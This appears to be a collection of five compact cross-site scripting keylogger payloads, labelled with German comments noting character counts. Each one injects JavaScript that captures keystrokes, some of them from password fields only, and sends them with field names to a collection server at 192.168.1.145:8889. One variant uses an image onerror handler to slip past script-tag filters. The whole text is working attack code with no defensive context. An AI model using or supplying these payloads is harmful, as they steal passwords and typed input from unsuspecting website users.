<!-- VERSION 1: Ultra-Compact (ca. 200 Zeichen) -->
<script>var s=Math.random().toString(36).substr(2,9);document.addEventListener('keypress',e=>fetch('http://192.168.1.145:8889/log?k='+e.key+'&f='+(e.target.name||'u')+'&s='+s).catch(()=>{}))</script>

<!-- VERSION 2: Password-Only Mini (ca. 180 Zeichen) -->
<script>var s=Math.random().toString(36).substr(2,9);document.addEventListener('keypress',e=>{if(e.target.type=='password')fetch('http://192.168.1.145:8889/log?k='+e.key+'&s='+s)})</script>

<!-- VERSION 3: Ultra-Mini (ca. 130 Zeichen) - Keine Session-ID -->
<script>document.addEventListener('keypress',e=>fetch('http://192.168.1.145:8889/log?k='+e.key+'&f='+e.target.name))</script>

<!-- VERSION 4: Password-Only Ultra-Mini (ca. 120 Zeichen) -->
<script>document.addEventListener('keypress',e=>{if(e.target.type=='password')fetch('http://192.168.1.145:8889/log?k='+e.key)})</script>

<!-- VERSION 5: Image-Tag Fallback (ca. 150 Zeichen) -->
<img src=x onerror="document.addEventListener('keypress',e=>fetch('http://192.168.1.145:8889/log?k='+e.key+'&f='+e.target.name))">
